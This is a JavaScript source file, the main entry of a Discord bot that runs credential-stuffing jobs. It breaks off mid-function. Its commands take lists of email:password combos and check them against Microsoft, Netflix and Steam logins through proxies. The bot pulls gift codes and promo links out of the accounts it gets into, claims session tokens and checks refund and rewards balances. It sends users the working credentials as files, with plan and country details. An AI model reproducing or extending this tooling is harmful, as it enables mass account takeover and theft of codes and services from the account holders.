// ============================================================
//  AutizMens Discord Bot — main entry
// ============================================================

const { Client, GatewayIntentBits, Partials, ActionRowBuilder, ButtonBuilder, ButtonStyle, AttachmentBuilder } = require("discord.js");
const config = require("./config");
const { AuthManager, parseDuration, formatDuration } = require("./utils/auth-manager");
const { ConcurrencyLimiter } = require("./utils/concurrency");
const { OTPManager } = require("./utils/otp-manager");
const { StatsManager } = require("./utils/stats-manager");
const { sendToWebhook } = require("./utils/webhook");
const { checkCodes } = require("./utils/microsoft-checker");
const { claimWlids } = require("./utils/microsoft-claimer");
const { pullCodes, pullLinks } = require("./utils/microsoft-puller");
const { checkRefundAccounts } = require("./utils/microsoft-refund");
const { checkInboxAccounts, getServiceCount } = require("./utils/microsoft-inbox");
const { loadProxies, isProxyEnabled, getProxyCount, getProxyStats } = require("./utils/proxy-manager");
const blacklist = require("./utils/blacklist");
const { setWlids, getWlids, getWlidCount } = require("./utils/wlid-store");
const welcomeStore = require("./utils/welcome-store");
const autopilot = require("./utils/autopilot");
const gen = require("./utils/gen-store");
const antilink = require("./utils/antilink");
const { extractCombos } = require("./utils/combo-extractor");
const { checkRewardsBalances } = require("./utils/microsoft-rewards");
const { checkNetflixAccounts } = require("./utils/netflix-checker");
const { checkSteamAccounts, shortenGames } = require("./utils/steam-checker");
const {
  progressEmbed, checkResultsEmbed, claimResultsEmbed,
  pullFetchProgressEmbed, pullLiveProgressEmbed, pullResultsEmbed,
  promoPullerFetchProgressEmbed, promoPullerResultsEmbed,
  inboxAioProgressEmbed, inboxAioResultsEmbed,
  rewardsResultsEmbed, refundProgressEmbed, refundResultsEmbed,
  netflixProgressEmbed, netflixResultsEmbed,
  steamProgressEmbed, steamResultsEmbed,
  errorEmbed, successEmbed, infoEmbed, authListEmbed,
  helpOverviewEmbed, helpCategoryEmbed, helpSelectMenu,
  welcomeEmbed, adminPanelEmbed, detailedStatsEmbed, textAttachment,
} = require("./utils/embeds");

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages,
  ],
  partials: [Partials.Message, Partials.Channel],
});

const auth = new AuthManager();
const limiter = new ConcurrencyLimiter(config.MAX_CONCURRENT_USERS);
const otpManager = new OTPManager();
const statsManager = new StatsManager();

let webhookUrl = "";
const activeAborts = new Map();

// Seed config-defined antilink channels
for (const ch of (config.ANTILINK_CHANNELS || [])) antilink.addChannel(ch);

// ── Helpers ──────────────────────────────────────────────────

function isOwner(userId) { return userId === config.OWNER_ID; }

const PULLER_CHECKER_CMDS = new Set(["pull", "promopuller", "check", "claim"]);
const INBOX_NORMAL_CMDS = new Set(["inboxaio", "rewards", "wlidset", "refund", "netflix", "steam", "help", "stats"]);

function getRequiredChannel(cmd) {
  if (PULLER_CHECKER_CMDS.has(cmd)) return config.ALLOWED_CHANNEL_PULLER;
  if (INBOX_NORMAL_CMDS.has(cmd)) return config.ALLOWED_CHANNEL_INBOX;
  return null;
}

function checkChannelAccess(channelId, cmd) {
  const required = getRequiredChannel(cmd);
  if (!required) return { allowed: true };
  if (channelId === required) return { allowed: true };
  return { allowed: false, requiredChannel: required };
}

function canUse(userId) {
  if (blacklist.isBlacklisted(userId)) return false;
  const allowed = isOwner(userId) || auth.isAuthorized(userId);
  if (allowed) otpManager.ensureAuthenticated(userId);
  return allowed;
}

async function sendWelcomeIfNeeded(user) {
  if (welcomeStore.hasWelcomed(user.id)) return;
  if (welcomeStore.markWelcomed(user.id)) {
    try { await user.send({ embeds: [welcomeEmbed(user.username)] }); } catch {}
  }
}

const MAX_COMBO_LINES = 4000;

function splitInput(raw) {
  if (!raw) return [];
  return raw.split(/[\n,]+/).map((s) => s.trim()).filter(Boolean);
}

async function fetchAttachmentLines(attachment) {
  if (!attachment) return [];
  const res = await fetch(attachment.url);
  const text = await res.text();
  return text.split("\n").map((l) => l.trim()).filter(Boolean);
}

/**
 * Collect combos from inline arg + attachment, normalize via extractor, cap at MAX.
 * Returns { combos, skipped } where skipped is how many lines past cap.
 */
async function collectCombos(rawText, attachment) {
  let lines = splitInput(rawText);
  if (attachment) lines = lines.concat(await fetchAttachmentLines(attachment));
  const total = lines.length;
  // Normalize even if user pastes dirty data
  const combos = extractCombos(lines, MAX_COMBO_LINES);
  const skipped = Math.max(0, total - MAX_COMBO_LINES);
  return { combos, skipped, total };
}

function stopButton(userId) {
  return new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`stop_${userId}`).setLabel("Stop").setStyle(ButtonStyle.Secondary)
  );
}

async function updateProgress(msg, embed, userId) {
  try { await msg.edit({ embeds: [embed], components: [stopButton(userId)] }); } catch {}
}

function sourceListAttachment(combos, label = "sources.txt") {
  return textAttachment(combos, label);
}

// ── Authorization gate with autopilot prompt ────────────────

async function ensureAuthorized(message) {
  if (canUse(message.author.id)) return true;
  if (blacklist.isBlacklisted(message.author.id)) {
    await message.reply({ embeds: [errorEmbed("You are blacklisted.")] });
    return false;
  }
  if (autopilot.isEnabled()) {
    if (!autopilot.wasPrompted(message.author.id)) {
      autopilot.markPrompted(message.author.id, message.channelId);
    }
    await message.reply({
      embeds: [infoEmbed(
        "Hi unauthorised dude",
        "Reply `milk` to this chat to gain auto access (10 days).\nIf not, wait for the owner to authorize you."
      )],
    });
  } else {
    await message.reply({ embeds: [errorEmbed("You are not authorized. Wait for the owner.")] });
  }
  return false;
}

// ── WLID Set ────────────────────────────────────────────────

async function handleWlidSet(respond, userId, wlidsRaw, wlidsFile) {
  if (!isOwner(userId)) return respond({ embeds: [errorEmbed("Only the bot owner can set WLIDs.")] });
  let wlids = splitInput(wlidsRaw);
  if (wlidsFile) wlids = wlids.concat(await fetchAttachmentLines(wlidsFile));
  if (wlids.length === 0) return respond({ embeds: [errorEmbed("No WLID tokens provided.")] });
  setWlids(wlids);
  return respond({ embeds: [successEmbed(`WLID tokens updated. **${wlids.length}** stored.`)] });
}

// ── Check ───────────────────────────────────────────────────

async function handleCheck(respond, userId, wlidsRaw, codesRaw, codesFile, threads, dmUser) {
  if (!canUse(userId)) return respond({ embeds: [errorEmbed("Not authorized.")] });
  const acquire = limiter.acquire(userId, "check");
  if (!acquire.ok) return respond({ embeds: [errorEmbed(acquire.reason === "busy" ? "You already have a command running." : "Too many concurrent users.")] });

  const ac = new AbortController();
  activeAborts.set(userId, ac);
  try {
    let wlids = splitInput(wlidsRaw);
    if (wlids.length === 0) wlids = getWlids();
    let codes = splitInput(codesRaw);
    if (codesFile) codes = codes.concat(await fetchAttachmentLines(codesFile));
    if (codes.length > MAX_COMBO_LINES) codes = codes.slice(0, MAX_COMBO_LINES);

    if (wlids.length === 0) return respond({ embeds: [errorEmbed("No WLIDs stored. Use .wlidset first.")] });
    if (codes.length === 0) return respond({ embeds: [errorEmbed("No codes provided.")] });

    const msg = await respond({ embeds: [progressEmbed(0, codes.length, "Checking codes")], components: [stopButton(userId)], fetchReply: true });
    let last = Date.now();
    const results = await checkCodes(wlids, codes, threads, (done, total) => {
      if (Date.now() - last > 2000) { last = Date.now(); updateProgress(msg, progressEmbed(done, total, "Checking codes"), userId); }
    }, ac.signal);

    const files = [];
    const valid = results.filter((r) => r.status === "valid");
    if (valid.length) files.push(textAttachment(valid.map((r) => r.title ? `${r.code} | ${r.title}` : r.code), "valid.txt"));
    const used = results.filter((r) => r.status === "used");
    if (used.length) files.push(textAttachment(used.map((r) => r.code), "used.txt"));
    const expired = results.filter((r) => r.status === "expired");
    if (expired.length) files.push(textAttachment(expired.map((r) => r.code), "expired.txt"));
    const invalid = results.filter((r) => r.status === "invalid" || r.status === "error");
    if (invalid.length) files.push(textAttachment(invalid.map((r) => r.code), "invalid.txt"));

    const embed = checkResultsEmbed(results);
    if (dmUser) {
      try { await dmUser.send({ embeds: [embed], files }); await msg.edit({ embeds: [infoEmbed("Check Complete", "Results sent to your DMs.")], components: [] }); }
      catch { await msg.edit({ embeds: [embed], files, components: [] }); }
    } else { await msg.edit({ embeds: [embed], files, components: [] }); }
  } catch (err) { await respond({ embeds: [errorEmbed(err.message)] }); }
  finally { activeAborts.delete(userId); limiter.release(userId); }
}

// ── Claim ───────────────────────────────────────────────────

async function handleClaim(respond, userId, accountsRaw, accountsFile, threads, dmUser) {
  if (!canUse(userId)) return respond({ embeds: [errorEmbed("Not authorized.")] });
  const acquire = limiter.acquire(userId, "claim");
  if (!acquire.ok) return respond({ embeds: [errorEmbed(acquire.reason === "busy" ? "You already have a command running." : "Too many users.")] });

  const ac = new AbortController(); activeAborts.set(userId, ac);
  try {
    const { combos: accounts, skipped } = await collectCombos(accountsRaw, accountsFile);
    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid email:password lines found.")] });

    const msg = await respond({ embeds: [progressEmbed(0, accounts.length, skipped ? `Claiming (${skipped} extra lines skipped)` : "Claiming WLIDs")], components: [stopButton(userId)], fetchReply: true });
    let last = Date.now();
    const results = await claimWlids(accounts, threads, (d, t) => { if (Date.now() - last > 2000) { last = Date.now(); updateProgress(msg, progressEmbed(d, t, "Claiming WLIDs"), userId); } }, ac.signal);

    const files = [];
    const success = results.filter((r) => r.success && r.token);
    if (success.length) files.push(textAttachment(success.map((r) => r.token), "tokens.txt"));
    const failed = results.filter((r) => !r.success);
    if (failed.length) files.push(textAttachment(failed.map((r) => `${r.email}: ${r.error || "fail"}`), "failed.txt"));

    const embed = claimResultsEmbed(results);
    if (dmUser) { try { await dmUser.send({ embeds: [embed], files }); await msg.edit({ embeds: [infoEmbed("Claim Complete", "Sent to DMs.")], components: [] }); } catch { await msg.edit({ embeds: [embed], files, components: [] }); } }
    else { await msg.edit({ embeds: [embed], files, components: [] }); }
  } catch (err) { await respond({ embeds: [errorEmbed(err.message)] }); }
  finally { activeAborts.delete(userId); limiter.release(userId); }
}

// ── Pull ────────────────────────────────────────────────────

async function handlePull(respond, userId, accountsRaw, accountsFile, dmUser, username) {
  if (!canUse(userId)) return respond({ embeds: [errorEmbed("Not authorized.")] });
  const acquire = limiter.acquire(userId, "pull");
  if (!acquire.ok) return respond({ embeds: [errorEmbed(acquire.reason === "busy" ? "Busy." : "Too many users.")] });
  const ac = new AbortController(); activeAborts.set(userId, ac);
  const startTime = Date.now();
  try {
    const { combos: accounts, skipped } = await collectCombos(accountsRaw, accountsFile);
    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid email:password lines found.")] });

    const msg = await respond({
      embeds: [pullFetchProgressEmbed({ done: 0, total: accounts.length, totalCodes: 0, working: 0, failed: 0, withCodes: 0, noCodes: 0, startTime, username })],
      components: [stopButton(userId)], fetchReply: true,
    });

    let last = Date.now();
    let totalCodes = 0, lastAcc = "", lastCodes = 0, lastErr = null;
    let work = 0, fail = 0, withC = 0, noC = 0;
    let fetchRef = [], vCounts = {};

    const { fetchResults, validateResults } = await pullCodes(accounts, (phase, d) => {
      const now = Date.now();
      if (phase === "fetch") {
        totalCodes += d.codes; lastAcc = d.email; lastCodes = d.codes; lastErr = d.error;
        if (d.error) fail++; else { work++; (d.codes > 0 ? withC++ : noC++); }
        if (now - last > 2000) {
          last = now;
          updateProgress(msg, pullFetchProgressEmbed({ done: d.done, total: d.total, totalCodes, working: work, failed: fail, withCodes: withC, noCodes: noC, lastAccount: lastAcc, lastCodes, lastError: lastErr, startTime, username }), userId);
        }
      } else if (phase === "validate_start") {
        if (d.fetchResults) fetchRef = d.fetchResults;
        totalCodes = fetchRef.reduce((s, r) => s + r.codes.length, 0);
        vCounts = { done: 0, total: d.total, valid: 0, used: 0, balance: 0, expired: 0, regionLocked: 0, invalid: 0 };
        updateProgress(msg, pullLiveProgressEmbed(fetchRef, vCounts, { username, startTime }), userId);
      } else if (phase === "validate") {
        vCounts.done = d.done;
        if (d.status) {
          if (d.status === "valid") vCounts.valid++;
          else if (d.status === "used" || d.status === "REDEEMED") vCounts.used++;
          else if (d.status === "BALANCE_CODE") vCounts.balance++;
          else if (d.status === "expired" || d.status === "EXPIRED") vCounts.expired++;
          else if (d.status === "REGION_LOCKED") vCounts.regionLocked++;
          else vCounts.invalid++;
        }
        if (now - last > 2000) { last = now; updateProgress(msg, pullLiveProgressEmbed(fetchRef, vCounts, { username, startTime }), userId); }
      }
    }, ac.signal);

    const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
    const files = [];
    const valid = validateResults.filter((r) => r.status === "valid");
    if (valid.length) files.push(textAttachment(valid.map((r) => r.title ? `${r.code} | ${r.title}` : r.code), "valid.txt"));
    const used = validateResults.filter((r) => r.status === "used");
    if (used.length) files.push(textAttachment(used.map((r) => r.code), "used.txt"));
    const expired = validateResults.filter((r) => r.status === "expired");
    if (expired.length) files.push(textAttachment(expired.map((r) => r.code), "expired.txt"));
    const invalid = validateResults.filter((r) => r.status === "invalid" || r.status === "error");
    if (invalid.length) files.push(textAttachment(invalid.map((r) => r.code), "invalid.txt"));

    // Source mapping: which account produced which codes
    const srcLines = [];
    for (const r of fetchResults) {
      if (r.codes && r.codes.length) {
        srcLines.push(`# ${r.email}`);
        for (const c of r.codes) srcLines.push(c);
        srcLines.push("");
      }
    }
    if (srcLines.length) files.push(textAttachment(srcLines, "sources.txt"));
    files.push(sourceListAttachment(accounts, "accounts_used.txt"));

    const embed = pullResultsEmbed(fetchResults, validateResults, { elapsed, dmSent: !!dmUser, username });
    if (dmUser) { try { await dmUser.send({ embeds: [embed], files }); await msg.edit({ embeds: [embed], components: [] }); } catch { await msg.edit({ embeds: [embed], files, components: [] }); } }
    else { await msg.edit({ embeds: [embed], files, components: [] }); }
  } catch (err) { await respond({ embeds: [errorEmbed(err.message)] }); }
  finally { activeAborts.delete(userId); limiter.release(userId); }
}

// ── PromoPuller ─────────────────────────────────────────────

async function handlePromoPuller(respond, userId, accountsRaw, accountsFile, dmUser, username) {
  if (!canUse(userId)) return respond({ embeds: [errorEmbed("Not authorized.")] });
  const acquire = limiter.acquire(userId, "promopuller");
  if (!acquire.ok) return respond({ embeds: [errorEmbed("Busy or full.")] });
  const ac = new AbortController(); activeAborts.set(userId, ac);
  const startTime = Date.now();
  try {
    const { combos: accounts } = await collectCombos(accountsRaw, accountsFile);
    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts.")] });

    const msg = await respond({ embeds: [promoPullerFetchProgressEmbed({ done: 0, total: accounts.length, totalLinks: 0, working: 0, failed: 0, withLinks: 0, noLinks: 0, startTime, username })], components: [stopButton(userId)], fetchReply: true });
    let last = Date.now(), tot = 0, w = 0, f = 0, wl = 0, nl = 0, lastAcc = "", lastL = 0, lastErr = null;

    const { fetchResults, allLinks } = await pullLinks(accounts, (phase, d) => {
      if (phase !== "fetch") return;
      tot += d.links; lastAcc = d.email; lastL = d.links; lastErr = d.error;
      if (d.error) f++; else { w++; (d.links > 0 ? wl++ : nl++); }
      if (Date.now() - last > 2000) {
        last = Date.now();
        updateProgress(msg, promoPullerFetchProgressEmbed({ done: d.done, total: d.total, totalLinks: tot, working: w, failed: f, withLinks: wl, noLinks: nl, lastAccount: lastAcc, lastLinks: lastL, lastError: lastErr, startTime, username }), userId);
      }
    }, ac.signal);

    const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
    const files = [];
    if (allLinks.length) files.push(textAttachment(allLinks, "links_all.txt"));
    const unique = [...new Set(allLinks)];
    if (unique.length && unique.length !== allLinks.length) files.push(textAttachment(unique, "links_unique.txt"));

    const perAcc = fetchResults.filter((r) => !r.error && r.links.length).map((r) => `# ${r.email}\n${r.links.join("\n")}`);
    if (perAcc.length) files.push(textAttachment(perAcc, "links_by_account.txt"));
    files.push(sourceListAttachment(accounts, "accounts_used.txt"));

    const embed = promoPullerResultsEmbed(fetchResults, allLinks, { elapsed, dmSent: !!dmUser, username });
    if (dmUser) { try { await dmUser.send({ embeds: [embed], files }); await msg.edit({ embeds: [embed], components: [] }); } catch { await msg.edit({ embeds: [embed], files, components: [] }); } }
    else { await msg.edit({ embeds: [embed], files, components: [] }); }
  } catch (err) { await respond({ embeds: [errorEmbed(err.message)] }); }
  finally { activeAborts.delete(userId); limiter.release(userId); }
}

// ── Refund ──────────────────────────────────────────────────

async function handleRefund(respond, userId, accountsRaw, accountsFile, threads, dmUser, username) {
  if (!canUse(userId)) return respond({ embeds: [errorEmbed("Not authorized.")] });
  const acquire = limiter.acquire(userId, "refund");
  if (!acquire.ok) return respond({ embeds: [errorEmbed("Busy or full.")] });
  const ac = new AbortController(); activeAborts.set(userId, ac);
  const startTime = Date.now();
  try {
    const { combos: accounts } = await collectCombos(accountsRaw, accountsFile);
    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts.")] });

    const msg = await respond({ embeds: [refundProgressEmbed({ done: 0, total: accounts.length, hits: 0, free: 0, fails: 0, startTime, username })], components: [stopButton(userId)], fetchReply: true });
    let last = Date.now(), hits = 0, frees = 0, fails = 0;
    const results = await checkRefundAccounts(accounts, threads, (done, total, status) => {
      if (status === "hit") hits++; else if (status === "free") frees++; else fails++;
      if (Date.now() - last > 2000) { last = Date.now(); updateProgress(msg, refundProgressEmbed({ done, total, hits, free: frees, fails, startTime, username }), userId); }
    }, ac.signal);

    const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
    const files = [];
    const hitR = results.filter((r) => r.status === "hit");
    if (hitR.length) {
      const lines = hitR.map((r) => {
        const cap = Object.entries(r.captures || {}).map(([k, v]) => `${k}: ${v}`).join(" | ");
        return `${r.user}:${r.password} | ${cap}`;
      });
      files.push(textAttachment(lines, "refundable.txt"));
    }
    const freeR = results.filter((r) => r.status === "free");
    if (freeR.length) files.push(textAttachment(freeR.map((r) => `${r.user}:${r.password}`), "no_refundable.txt"));
    const failR = results.filter((r) => r.status === "fail");
    if (failR.length) files.push(textAttachment(failR.map((r) => `${r.user}:${r.password} | ${r.detail}`), "failed.txt"));

    const embed = refundResultsEmbed(results, { elapsed, dmSent: !!dmUser, username });
    if (dmUser) { try { await dmUser.send({ embeds: [embed], files }); await msg.edit({ embeds: [embed], components: [] }); } catch { await msg.edit({ embeds: [embed], files, components: [] }); } }
    else { await msg.edit({ embeds: [embed], files, components: [] }); }
  } catch (err) { await respond({ embeds: [errorEmbed(err.message)] }); }
  finally { activeAborts.delete(userId); limiter.release(userId); }
}

// ── Inbox AIO ───────────────────────────────────────────────

async function handleInboxAio(respond, userId, accountsRaw, accountsFile, threads, dmUser) {
  if (!canUse(userId)) return respond({ embeds: [errorEmbed("Not authorized.")] });
  const acquire = limiter.acquire(userId, "inboxaio");
  if (!acquire.ok) return respond({ embeds: [errorEmbed("Busy or full.")] });
  const ac = new AbortController(); activeAborts.set(userId, ac);
  try {
    const { combos: accounts } = await collectCombos(accountsRaw, accountsFile);
    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts.")] });

    const startTime = Date.now();
    const live = {};
    const msg = await respond({ embeds: [inboxAioProgressEmbed({ completed: 0, total: accounts.length, hits: 0, fails: 0, elapsed: 0, serviceBreakdown: {} })], components: [stopButton(userId)], fetchReply: true });
    let last = Date.now(), hits = 0, fails = 0;
    const results = await checkInboxAccounts(accounts, threads, (done, total, status, h, f, lr) => {
      hits = h || 0; fails = f || 0;
      if (lr?.services) for (const n of Object.keys(lr.services)) live[n] = (live[n] || 0) + 1;
      if (Date.now() - last > 2500) { last = Date.now(); updateProgress(msg, inboxAioProgressEmbed({ completed: done, total, hits, fails, elapsed: Date.now() - startTime, latestAccount: lr?.user || "", latestStatus: status || "", serviceBreakdown: { ...live } }), userId); }
    }, ac.signal);

    const elapsed = Date.now() - startTime;
    const hitResults = results.filter((r) => r.status === "hit");
    const failResults = results.filter((r) => r.status === "fail");
    const lockedResults = results.filter((r) => r.status === "locked" || r.status === "custom");
    const twoFA = results.filter((r) => r.status === "2fa");

    const breakdown = {};
    for (const r of hitResults) for (const [n] of Object.entries(r.services || {})) breakdown[n] = (breakdown[n] || 0) + 1;

    const zipEntries = [];
    const svcFiles = {};
    for (const r of hitResults) {
      for (const [n, d] of Object.entries(r.services || {})) {
        if (!svcFiles[n]) svcFiles[n] = [];
        let line = `${r.user}:${r.password}`;
        if (d.count) line += ` | Found: ${d.count}`;
        svcFiles[n].push(line);
      }
    }
    for (const [n, l] of Object.entries(svcFiles)) zipEntries.push({ name: `${n.replace(/[^a-z0-9]/gi, "_").toLowerCase()}_hits.txt`, content: l.join("\n") });
    if (hitResults.length) zipEntries.push({ name: "all_hits.txt", content: hitResults.map((r) => `${r.user}:${r.password}`).join("\n") });
    if (failResults.length) zipEntries.push({ name: "failed.txt", content: failResults.map((r) => `${r.user}:${r.password} | ${r.detail || "fail"}`).join("\n") });
    if (lockedResults.length) zipEntries.push({ name: "locked.txt", content: lockedResults.map((r) => `${r.user}:${r.password}`).join("\n") });
    if (twoFA.length) zipEntries.push({ name: "2fa.txt", content: twoFA.map((r) => `${r.user}:${r.password}`).join("\n") });

    const embed = inboxAioResultsEmbed({ total: results.length, hits: hitResults.length, fails: failResults.length, locked: lockedResults.length, twoFA: twoFA.length, elapsed, serviceBreakdown: breakdown, username: dmUser?.username });
    const { buildZipBuffer } = require("./utils/zip-builder");
    const zip = new AttachmentBuilder(buildZipBuffer(zipEntries), { name: "inboxaio_results.zip" });
    if (dmUser) { try { await dmUser.send({ embeds: [embed], files: [zip] }); await msg.edit({ embeds: [infoEmbed("Inbox AIO Complete", "Results sent to your DMs.")], components: [] }); } catch { await msg.edit({ embeds: [embed], files: [zip], components: [] }); } }
    else { await msg.edit({ embeds: [embed], files: [zip], components: [] }); }
    statsManager.record(userId, "inboxaio", hitResults.length);
  } catch (err) { await respond({ embeds: [errorEmbed(err.message)] }); }
  finally { activeAborts.delete(userId); limiter.release(userId); }
}

// ── Rewards ─────────────────────────────────────────────────

async function handleRewards(respond, userId, accountsRaw, accountsFile, threads, dmUser) {
  if (!canUse(userId)) return respond({ embeds: [errorEmbed("Not authorized.")] });
  const acquire = limiter.acquire(userId, "rewards");
  if (!acquire.ok) return respond({ embeds: [errorEmbed("Busy or full.")] });
  const ac = new AbortController(); activeAborts.set(userId, ac);
  try {
    const { combos: accounts } = await collectCombos(accountsRaw, accountsFile);
    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts.")] });

    const msg = await respond({ embeds: [progressEmbed(0, accounts.length, "Checking rewards")], components: [stopButton(userId)], fetchReply: true });
    let last = Date.now();
    const results = await checkRewardsBalances(accounts, threads, (d, t) => { if (Date.now() - last > 2000) { last = Date.now(); updateProgress(msg, progressEmbed(d, t, "Checking rewards"), userId); } }, ac.signal);
    const embed = rewardsResultsEmbed(results);
    const files = [textAttachment(results.map((r) => `${r.email}: ${r.balance ?? "?"} pts`), "rewards.txt")];
    if (dmUser) { try { await dmUser.send({ embeds: [embed], files }); await msg.edit({ embeds: [embed], components: [] }); } catch { await msg.edit({ embeds: [embed], files, components: [] }); } }
    else { await msg.edit({ embeds: [embed], files, components: [] }); }
  } catch (err) { await respond({ embeds: [errorEmbed(err.message)] }); }
  finally { activeAborts.delete(userId); limiter.release(userId); }
}

// ── Netflix / Steam (kept) ──────────────────────────────────

async function handleNetflix(respond, userId, accountsRaw, accountsFile, threads, dmUser) {
  if (!canUse(userId)) return respond({ embeds: [errorEmbed("Not authorized.")] });
  const acquire = limiter.acquire(userId, "netflix");
  if (!acquire.ok) return respond({ embeds: [errorEmbed("Busy or full.")] });
  const ac = new AbortController(); activeAborts.set(userId, ac);
  try {
    const { combos: accounts } = await collectCombos(accountsRaw, accountsFile);
    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts.")] });
    const stats = { premium: 0, standard: 0, basic: 0, free: 0, cancelled: 0, invalid: 0, blocked: 0, timeout: 0, errors: 0 };
    const hits = [];
    const msg = await respond({ embeds: [netflixProgressEmbed(0, accounts.length, stats)], components: [stopButton(userId)], fetchReply: true });
    const start = Date.now(); let last = 0;
    await checkNetflixAccounts(accounts, Math.min(threads, 10), (c, t, r) => {
      if (r) {
        if (r.status === "hit") { hits.push(r); const p = (r.plan || "").toLowerCase(); if (p.includes("premium")) stats.premium++; else if (p.includes("standard")) stats.standard++; else if (p.includes("basic")) stats.basic++; }
        else if (r.status === "invalid") stats.invalid++; else if (r.status === "blocked") stats.blocked++; else if (r.status === "timeout") stats.timeout++; else stats.errors++;
      }
      if (Date.now() - last > 3000) { last = Date.now(); updateProgress(msg, netflixProgressEmbed(c, t, stats), userId); }
    }, ac.signal);
    const elapsed = Math.round((Date.now() - start) / 1000);
    const files = [];
    if (hits.length) files.push(new AttachmentBuilder(Buffer.from(hits.map((h) => `${h.email}:${h.password} | ${h.plan} | ${h.country}`).join("\n"), "utf-8"), { name: "netflix_hits.txt" }));
    const embed = netflixResultsEmbed({ total: accounts.length, hits: hits.length, ...stats, elapsed, username: dmUser?.username });
    if (dmUser) { try { await dmUser.send({ embeds: [embed], files }); await msg.edit({ embeds: [embed], components: [] }); } catch { await msg.edit({ embeds: [embed], files, components: [] }); } }
    else { await msg.edit({ embeds: [embed], files, components: [] }); }
  } catch (err) { await respond({ embeds: [errorEmbed(err.message)] }); }
  finally { activeAborts.delete(userId); limiter.release(userId); }
}

async function handleSteam(respond, userId, accountsRaw, accountsFile, threads, dmUser) {
  if (!canUse(userId)) return respond({ embeds: [errorEmbed("Not authorized.")] });
  const acquire = limiter.acquire(userId, "steam");
  if (!acquire.ok) return respond({ embeds: [errorEmbed("Busy or full.")] });
  const ac = new AbortController(); activeAborts.set(userId, ac);
  try {
    const { combos: accounts } = await collectCombos(accountsRaw, accountsFile);
    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts.")] });
    const stats = { valid: 0, invalid: 0 }; const hits = [];
    const msg = await respond({ embeds: [steamProgressEmbed(0, accounts.length, stats)], components: [stopButton(userId)], fetchReply: true });
    const start = Date.now(); let last = 0;
    await checkSteamAccounts(accounts, Math.min(threads, 15), (c, t, r) => {
      if (r) { stats.valid++; hits.push(r); } else stats.invalid++;
      if (Date.now() - last > 3000) { last = Date.now(); updateProgress(msg, steamProgressEmbed(c, t, stats), userId); }
    }, ac.signal);
    const elapsed = Math.round((Date.now() - start) / 1000);
    const files = [];
    if (hits.length) files.push(new AttachmentBuilder(Buffer.from(hits.map((h) => `${h.username}:${h.password} | ${shortenGames(h.games, 5)}`).join("\n"), "utf-8"), { name: "steam_hits.txt" }));
    const embed = steamResultsEmbed({ total: accounts.length, valid: stats.valid, invalid: stats.invalid, elapsed, username: dmUser?.username });
    if (dmUser) { try { await dmUser.send({ embeds: [embed], files }); await msg.edit({ embeds: [embed], components: [] }); } catch { await msg.edit({ embeds: [embed], files, components: [] }); } }
    else { await msg.edit({ embeds: [embed], files, components: [] }); }
  } catch (err) { await respond({ embeds: [errorEmbed(err.message)] }); }
  finally { activeAborts.delete(userId); limiter.release(userId); }
}

// ── Auth admin handlers ─────────────────────────────────────

async function handleAuth(respond, callerId, targetId, durationStr) {
  if (!isOwner(callerId)) return respond({ embeds: [errorEmbed("Owner only.")] });
  const ms = parseDuration(durationStr);
  if (ms === null) return respond({ embeds: [errorEmbed(`Invalid duration: \`${durationStr}\``)] });
  auth.authorize(targetId, ms, callerId);
  return respond({ embeds: [successEmbed(`<@${targetId}> authorized for **${ms === Infinity ? "Permanent" : formatDuration(ms)}**.`)] });
}
async function handleDeauth(respond, callerId, targetId) {
  if (!isOwner(callerId)) return respond({ embeds: [errorEmbed("Owner only.")] });
  auth.deauthorize(targetId);
  return respond({ embeds: [successEmbed(`<@${targetId}> deauthorized.`)] });
}
async function handleAuthList(respond) { return respond({ embeds: [authListEmbed(auth.getAllAuthorized())] }); }
async function handleStats(respond) {
  return respond({ embeds: [infoEmbed("Bot Status", [
    `Active: \`${limiter.getActiveCount()}/${config.MAX_CONCURRENT_USERS}\``,
    `Authorized: \`${auth.getAllAuthorized().length}\``,
    `Blacklisted: \`${blacklist.getCount()}\``,
    `WLIDs: \`${getWlidCount()}\``,
    `Proxies: \`${isProxyEnabled() ? `Enabled (${getProxyCount()})` : "Disabled"}\``,
    `Autopilot: \`${autopilot.isEnabled() ? "ON (10d access on milk)" : "OFF"}\``,
    `Ping: \`${client.ws.ping}ms\``,
  ].join("\n"))] });
}
async function handleBlacklist(respond, callerId, targetId, reason) {
  if (!isOwner(callerId)) return respond({ embeds: [errorEmbed("Owner only.")] });
  if (targetId === callerId) return respond({ embeds: [errorEmbed("Cannot blacklist yourself.")] });
  blacklist.add(targetId, reason || "No reason");
  return respond({ embeds: [successEmbed(`<@${targetId}> blacklisted.`)] });
}
async function handleUnblacklist(respond, callerId, targetId) {
  if (!isOwner(callerId)) return respond({ embeds: [errorEmbed("Owner only.")] });
  if (!blacklist.remove(targetId)) return respond({ embeds: [errorEmbed("Not blacklisted.")] });
  return respond({ embeds: [successEmbed(`<@${targetId}> removed from blacklist.`)] });
}
async function handleBlacklistShow(respond) {
  const entries = blacklist.getAll();
  if (!entries.length) return respond({ embeds: [infoEmbed("Blacklist", "Empty.")] });
  return respond({ embeds: [infoEmbed("Blacklist", entries.map((e, i) => `\`${i+1}.\` <@${e.userId}> — ${e.reason}`).join("\n"))] });
}
async function handleAdminPanel(respond, cid) {
  if (!isOwner(cid)) return respond({ embeds: [errorEmbed("Owner only.")] });
  return respond({ embeds: [adminPanelEmbed(statsManager.getSummary(), auth.getAllAuthorized().length, otpManager.getActiveSessionCount(), limiter.getActiveCount(), !!webhookUrl)] });
}
async function handleSetWebhook(respond, cid, url) {
  if (!isOwner(cid)) return respond({ embeds: [errorEmbed("Owner only.")] });
  if (!url || !url.startsWith("https://discord.com/api/webhooks/")) return respond({ embeds: [errorEmbed("Invalid webhook URL.")] });
  webhookUrl = url; return respond({ embeds: [successEmbed("Webhook set.")] });
}
async function handleBotStats(respond, cid) {
